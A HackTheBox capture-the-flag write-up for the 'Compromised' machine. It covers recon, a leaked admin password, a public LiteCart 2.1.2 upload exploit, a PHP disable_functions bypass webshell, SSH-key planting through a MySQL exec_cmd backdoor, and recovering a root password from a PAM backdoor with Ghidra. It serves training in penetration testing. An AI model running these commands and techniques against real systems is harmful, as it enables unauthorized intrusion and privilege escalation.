---
layout: post
title:  "HackTheBox Compromised Writeup" 
tags: hackthebox litecart-2-1-2 burp-proxy php-disable-functions-bypass reverse-engineering
categories: hackthebox active-machine 
rel-img: /assets/img/htb/compromised/compromised.png
description: Hard work to gain first access exploting litecart vulnerability, bypassing php disable functions and using mysql backdoor. Basic linux enumeration and reverse engineering to go straight to root!!
---

### Hackthebox Compromised Writeup
![Compromised](/assets/img/htb/compromised/compromised.png)

## Abstract

Hard work to gain first access exploting litecart vulnerability, bypassing php disable functions and using mysql backdoor. Basic linux enumeration and reverse engineering to go straight to root!!

## Summary
1. Initial foothold
  - Nmap recon
  - Gobuster enum
2. LiteCart 2.1.2 vulnerability
3. PHP disable functions Bypass
4. MYSQL Backdoor 
4. User Flag
5. Priviledge Escalation
  - Basic enumeration
  - Reverse Engineering
6. Root Flag

## Initial foothold

### Nmap recon

```
sh4ck@kali:~$ sudo nmap -A 10.10.10.207 -vv
[sudo] password for sh4ck: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 09:14 CET
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:14
Completed NSE at 09:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:14
Completed NSE at 09:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:14
Completed NSE at 09:14, 0.00s elapsed
Initiating Ping Scan at 09:14
Scanning 10.10.10.207 [4 ports]
Completed Ping Scan at 09:14, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:14
Completed Parallel DNS resolution of 1 host. at 09:14, 0.06s elapsed
Initiating SYN Stealth Scan at 09:14
Scanning 10.10.10.207 [1000 ports]
Discovered open port 80/tcp on 10.10.10.207
Discovered open port 22/tcp on 10.10.10.207
Completed SYN Stealth Scan at 09:15, 5.89s elapsed (1000 total ports)
Initiating Service scan at 09:15
Scanning 2 services on 10.10.10.207
Completed Service scan at 09:15, 6.12s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.207
Retrying OS detection (try #2) against 10.10.10.207
Initiating Traceroute at 09:15
Completed Traceroute at 09:15, 0.07s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 09:15
Completed Parallel DNS resolution of 2 hosts. at 09:15, 0.06s elapsed
NSE: Script scanning 10.10.10.207.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 1.89s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 0.21s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 0.00s elapsed
Nmap scan report for 10.10.10.207
Host is up, received echo-reply ttl 63 (0.053s latency).
Scanned at 2020-11-13 09:14:56 CET for 18s
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDTdyzps+EGggiAkP1TRZaSqrxkfupsb22iTn6m4y0OPxwBh1lOZdS+k0GkObYCwUyVLdbizi5MyehX5towah/MNJRbTXQYMWRHq9R6agtHQ/wVxKDarQStRcUQrVEOs+yK7olQXFiqYQlv0aNbx26YV9Ogs1T+KQlHmeCE0Cb5fR1u7phhSQkxC1F7U2cbwXauGjOT8wQn3lNbyIzealooAp2SJbGmmvXUCQxhlNvboi1B4GfOGVeA+PzN/mUxqdj8JPvqS+oILsyTbtUXdpl16Hg5wLqcqo5CBVc4nFFfRpobXndIVmKd6E5egJFC2X7kOwZMhoD9n2JLRNSh+pp
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHw5x8ksVTxgNM3Q2TxEm20DpKhq2rkmALsX2/O7CB0d4LWQRa4E2SlHJJ9HDrlGlf9qwzIDkeT2qWQ9GuoFX5c=
|   256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEu0c6bJTNWuXAtzU4dym2DBQAG0rWBBm2Srq9j7haTI
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: FD8AFB6FFE392F9ED98CC0B1B37B9A5D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Infomir MAG-250 set-top box (86%)
No exact OS matches for host (test conditions non-ideal).
```
Nmap showed me two ports open 22 and 80, where `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)` and `Apache httpd 2.4.29 ((Ubuntu))` services were running rispectively.

I started browsing web page but got nothing too interesting. So i moved forward to search files and directories with gobuster.

![webapp home page](/assets/img/htb/compromised/home-page.png)

### Gobuster enum

```
sh4ck@kali:~$ gobuster dir -u http://10.10.10.207/ -w /usr/share/wordlists/dirb/common.txt -t 40 -x .txt,.php,.html,.zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.207/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html,zip
[+] Timeout:        10s
===============================================================
2020/11/13 09:19:17 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.html (Status: 403)
/.hta.zip (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.zip (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/backup (Status: 301)
/index.php (Status: 302)
/index.php (Status: 302)
/server-status (Status: 403)
/shop (Status: 301)
===============================================================
2020/11/13 09:19:54 Finished
===============================================================
```
Gobuster discovered a backup folder that might contain some juicy.

![webapp home page](/assets/img/htb/compromised/backup-page.png)

In the folder there was a file called a.tar.gz. So i downloaded it locally and i extracted all files content in a single file and than i searched the word password:

```
sh4ck@kali:~/Desktop/compromised_htb$ strings a.tar.gz > baff
                                                                
sh4ck@kali:~/Desktop/compromised_htb$ cat baff | grep password
      if (empty($user->data['id']) && empty($_POST['password'])) throw new Exception(language::translate('error_must_enter_password', 'You must enter a password'));
      if (!empty($_POST['password']) && empty($_POST['confirmed_password'])) throw new Exception(language::translate('error_must_enter_confirmed_password', 'You must confirm the password'));
      if (!empty($_POST['password']) && $_POST['password'] != $_POST['confirmed_password']) throw new Exception(language::translate('error_passwords_missmatch', 'The passwords did not match'));
        'password',
      if (!empty($_POST['password'])) $user->set_password($_POST['password']);
          <label><?php echo language::translate('title_new_password', 'New Password'); ?></label>
          <?php echo functions::form_draw_password_field('password', '', 'autocomplete="off"'); ?>
          <label><?php echo language::translate('title_confirm_password', 'Confirm Password'); ?></label>
          <?php echo functions::form_draw_password_field('confirmed_password', '', 'autocomplete="off"'); ?>
          case (substr($setting['function'], 0, 8) == 'password'):
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
```

I found an interesting line 

`//file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);` 

that suggested me that the file `log2301c9430d8593ae.txt` could contain credentials. 

Indeed, browsing `http://10.10.10.207/shop/admin/./.log2301c9430d8593ae.txt` i found admin credentials `User: admin Passwd: theNextGenSt0r3!~` :
 
![webapp admin creds](/assets/img/htb/compromised/admin-creds.png)

With these credentials i was able to logging in as admin so i could discover LiteCart version:

![webapp admin page](/assets/img/htb/compromised/admin-page.png)

### LiteCart 2.1.2 Vulnerability

I continued searching LiteCart 2.1.2 vulnerabilities and i found `LiteCart 2.1.2 - Arbitrary File Upload` (https://www.exploit-db.com/exploits/45267)

So i ran the exploit:
```
sh4ck@kali:~/Desktop/compromised_htb/shop$ python lifecartexp.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/0GJPJ.php?c=id
```
Anyway when I tried to use that webshell I discovered that it didn’t work, so I modified the exploit code to run a phpinfo(), discovering that there were several php functions disabled.

### PHP disable functions bypass

Knowing the php version I searched for an exploit that bypassed disabled functions and found an article (https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html).

So i wrote the script locally modifying passed function parameter from `pwn("uname -a");` to `pwn($_GET[‘c’]);`

Next, i started burpsuite to intercept the upload request for my scrypt, from http://compromised.htb/shop/admin/?app=vqmods&doc=vqmods.

![webapp admin creds](/assets/img/htb/compromised/burp.png)

I just modified content-type to xml and this was enough to bypass the filter and upload the file.

I used `webwrap` to got interactive web shell:

```
sh4ck@kali:~/Documents/webwrap$ rlwrap python3 webwrap.py http://compromised.htb/shop/vqmod/xml/shacksh.php?c=WRAP

www-data@compromised:/var/www/html/shop/vqmod/xml$
```

After a bit long enumeration phase i got usefull info that could lead me to obtain user access.

### MYSQL Backdoor

Reading /etc/passwd file I noticed that the mysql user had /bin/bash and as the machine’s name suggest, this might be a hint that this service has some kind of backdoor :

```
www-data@compromised:/var/www/html/shop/vqmod/xml$ cat /etc/passwd
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
```
During enumeration i found a config file containing database credentials:
```
www-data@compromised:/var/www/html/shop/includes$ cat config.inc.php
// Database                                                                                                                
  define('DB_TYPE', 'mysql');                                                                                              
  define('DB_SERVER', 'localhost');                                                                                        
  define('DB_USERNAME', 'root');                                                                                           
  define('DB_PASSWORD', 'changethis');                                                                                     
  define('DB_DATABASE', 'ecom');                                                                                           
  define('DB_TABLE_PREFIX', 'lc_');                                                                                        
  define('DB_CONNECTION_CHARSET', 'utf8');                                                                                 
  define('DB_PERSISTENT_CONNECTIONS', 'false');
```
Searchingon gooogle about mysql backdoor I arrived to this article (https://recipeforroot.com/mysql-to-system-root/) which pushed me in right direction:

```
www-data@compromised:/var/www/html/shop/includes$ mysql -u root --password=changethis -e "use mysql; select * from func"
mysql: [Warning] Using a password on the command line interface can be insecure.
name    ret     dl      type
exec_cmd        0       libmysql.so     function
```
So i could use this exec_cmd function to execute commands as mysql user:
```
mysql -u root --password=changethis -e "select exec_cmd('id')"
mysql: [Warning] Using a password on the command line interface can be insecure.
exec_cmd('id')
uid=111(mysql) gid=113(mysql) groups=113(mysql)
```
I ran command  to add my ssh pub key to mysql user `authorized_key` 

```
www-data@compromised:/var/www/html/shop/vqmod/xml$ mysql -u root --password=changethis -e "select exec_cmd('echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXjmIwusvvlI+UM3l3q0IXHCERsiVHbQYaxBPqtZzzo sh4ck@kali > ~/.ssh/authorized_keys')"
mysql: [Warning] Using a password on the command line interface can be insecure.
exec_cmd('echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXjmIwusvvlI+UM3l3q0IXHCERsiVHbQYaxBPqtZzzo sh4ck@kali > ~/.ssh/authorized_keys')
\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
```
so i had ssh access as mysql user :

```
sh4ck@kali:~/Desktop/compromised_htb/shop$ ssh mysql@compromised.htb -i id_key 
The authenticity of host 'compromised.htb (10.10.10.207)' can't be established.
ECDSA key fingerprint is SHA256:eYvjeWOH3lYrex1T0a/7BQsAv9L4YbZem1T0BGWjtVE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'compromised.htb,10.10.10.207' (ECDSA) to the list of known hosts.
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
mysql@compromised:~$
```
I started new enumeration and found `strace-log.dat`. Grepping for passwords there was an interesting finding from mysql:

```
mysql@compromised:~$ cat strace-log.dat | grep password
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */)
```

Considering user in the system `sysadmin`, I tried to switch user with above password and got sysadmin shell:

```
mysql@compromised:~$ su sysadmin
Password: 
sysadmin@compromised:/var/lib/mysql$
```
Under sysadmin home i found user.txt

## Priviledge Escalation

### Pam Backdoor

In addition to basic enumeration, I decided to looking for recently modified things. I came across the following output:

```
sysadmin@compromised:/lib$ find . -mtime -24
.
./x86_64-linux-gnu/security
./x86_64-linux-gnu/security/.pam_unix.so
./x86_64-linux-gnu/security/pam_unix.so
./systemd/system
./udev
./udev/rules.d
./ifupdown
```

Looking for a pam backdoor , I found one in github that created the same archive (https://github.com/zephrax/linux-pam-backdoor)

So I decided to transfer this file to my machine using scp:
```
scp sysadmin@compromised.htb:/lib/x86_64-linux-gnu/security/pam_unix.so Desktop/pam_unix.so
```
### Reverse Engineering

Decompiling the functions with `Ghidra`, there were two hex strings inside `pam_sm_authenticate` belonging to variable backdoor:

![ghidra](/assets/img/htb/compromised/ghidra.png)

Switching this two strings to little endian and appending them we got the following hex string: `7a6c6b657e5533456e7638326d322d`

Decoding it i caught  the root password:

```	
sh4ck@kali:~/Desktop/compromised-htb/$ echo "7a6c6b657e5533456e7638326d322d" | xxd -r -p
zlke~U3Env82m2-
```
## Root Flag

Finally, i could access root account and got root.txt:
```
sysadmin@compromised:/lib$ su root
Password:
root@compromised:/lib# id
uid=0(root) gid=0(root) groups=0(root)
root@compromised:/lib# whoami
root
```
